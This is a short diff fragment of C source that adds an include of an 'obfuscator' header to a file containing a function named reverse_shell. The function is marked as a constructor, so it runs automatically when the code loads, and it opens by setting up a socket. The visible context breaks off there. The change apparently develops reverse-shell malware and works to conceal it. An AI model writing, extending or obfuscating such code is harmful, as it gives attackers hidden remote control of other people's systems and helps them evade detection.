@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 
+#include "../src/obfuscator.h"
  
 void __attribute__((constructor)) reverse_shell(){ 
   int socket_fd;
